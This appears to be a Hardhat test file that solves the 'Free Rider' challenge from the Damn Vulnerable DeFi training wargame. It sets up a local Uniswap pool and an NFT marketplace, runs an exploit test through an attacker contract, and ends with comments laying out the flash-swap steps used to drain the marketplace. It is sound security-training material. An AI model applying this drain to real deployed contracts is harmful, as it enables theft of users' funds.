import { time, loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
import { expect } from "chai";
import { ethers, network } from "hardhat";
import {SignerWithAddress} from "@nomiclabs/hardhat-ethers/signers";
import { BigNumber } from "ethers";

// Get compiled Uniswap v2 data
const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

describe("FreeRider Test", function () {
   
    let deployer: SignerWithAddress;
    let attacker: SignerWithAddress;
    let buyer: SignerWithAddress;

    // The NFT marketplace will have 6 tokens, at 15 ETH each
    const NFT_PRICE = ethers.utils.parseEther('15')
    const AMOUNT_OF_NFTS = 6;
    const MARKETPLACE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('90');

    // The buyer will offer 45 ETH as payout for the job                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
    const BUYER_PAYOUT = ethers.utils.parseEther('45');

    // Initial reserves for the Uniswap v2 pool
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('15000');
    const UNISWAP_INITIAL_WETH_RESERVE = ethers.utils.parseEther('9000');


    async function setupFixture() {
      /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker, buyer] = await ethers.getSigners();


        // Attacker starts with little ETH balance
        await network.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x6f05b59d3b20000", // 0.5 ETH
        ]);
        

        // Deploy WETH contract
        const weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy();

        // Deploy token to be traded against WETH in Uniswap v2
        const token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        const uniswapFactory = await (new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer)).deploy(
            ethers.constants.AddressZero // _feeToSetter
        );
        const uniswapRouter = await (new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer)).deploy(
            uniswapFactory.address,
            weth.address
        );
        
        // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
        // Note that the function takes care of deploying the pair automatically
        await token.approve(
            uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await uniswapRouter.addLiquidityETH(
            token.address,                                         // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        
        // Get a reference to the created Uniswap pair
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
        const uniswapPair = UniswapPairFactory.attach(
            await uniswapFactory.getPair(token.address, weth.address)
        );
    
        // Deploy the marketplace and get the associated ERC721 token
        // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
        const marketplace = await (await ethers.getContractFactory('FreeRiderNFTMarketplace', deployer)).deploy(
            AMOUNT_OF_NFTS,
            { value: MARKETPLACE_INITIAL_ETH_BALANCE }
        );
            
        // Deploy NFT contract
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const nft = DamnValuableNFTFactory.attach(await marketplace.token());

        // Ensure deployer owns all minted NFTs and approve the marketplace to trade them
        await nft.setApprovalForAll(marketplace.address, true);

        // Open offers in the marketplace
        await marketplace.offerMany(
            [0, 1, 2, 3, 4, 5],
            [NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE]
        );
       
        // Deploy buyer's contract, adding the attacker as the partner
        const buyerContract = await (await ethers.getContractFactory('FreeRiderBuyer', buyer)).deploy(
            attacker.address, // partner
            nft.address, 
            { value: BUYER_PAYOUT }
        );

        const FreeRiderHacker = await ethers.getContractFactory("FreeRiderHacker");
        const freeRiderHacker = await FreeRiderHacker.connect(attacker).deploy(token.address, weth.address, uniswapFactory.address, nft.address, buyerContract.address, marketplace.address)
        await freeRiderHacker.deployed();

        return {weth, token, uniswapFactory, uniswapRouter, uniswapPair, marketplace, buyerContract, nft, freeRiderHacker};
    }

    it("Deployment", async function () {
        const {weth, token, uniswapFactory, uniswapPair, marketplace, buyerContract, nft} = await loadFixture(setupFixture);
        expect(await uniswapPair.token0()).to.eq(weth.address);
        expect(await uniswapPair.token1()).to.eq(token.address);
        expect(await uniswapPair.balanceOf(deployer.address)).to.be.gt(0);
        
        for (let id = 0; id < AMOUNT_OF_NFTS; id++) {
            expect(await nft.ownerOf(id)).to.be.eq(deployer.address);
        }
        expect(await marketplace.amountOfOffers()).to.be.eq(6);
    });

    it("Exploit", async function () {
        const {weth, token, uniswapFactory, uniswapRouter, uniswapPair, marketplace, buyerContract, nft, freeRiderHacker} = await loadFixture(setupFixture);
        await weth.connect(attacker).deposit({value: ethers.utils.parseUnits("46", "15")});
        await weth.connect(attacker).approve(freeRiderHacker.address, ethers.utils.parseUnits("46", "15"));
        await freeRiderHacker.connect(attacker).hack(ethers.utils.parseEther("15"));
        await freeRiderHacker.connect(attacker).withdrawFunds();
        const bal = await weth.balanceOf(attacker.address);
        await weth.connect(attacker).withdraw(bal);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        /** SUCCESS CONDITIONS */

        // Attacker must have earned all ETH from the payout
        expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(BUYER_PAYOUT);
        expect(await ethers.provider.getBalance(buyerContract.address)).to.be.eq('0');

        // The buyer extracts all NFTs from its associated contract
        for (let tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            await nft.connect(buyer).transferFrom(buyerContract.address, buyer.address, tokenId);
            expect(await nft.ownerOf(tokenId)).to.be.eq(buyer.address);
        }

        // Exchange must have lost NFTs and ETH
        expect(await marketplace.amountOfOffers()).to.be.eq('0');
        expect(
            await ethers.provider.getBalance(marketplace.address)
        ).to.be.lt(MARKETPLACE_INITIAL_ETH_BALANCE);
    });  
    });

// 1) Take 15 WETH from the DVT/WETH pool
// 2) Buy nfts, get 90 ETH
// 3) RETURN 15 WETH + fee in WETH (you should approve fee for the hacker contract) to the pool
// 4) Withdraw WETH from the hacker contract
// 5) Now you have 120 +- ETH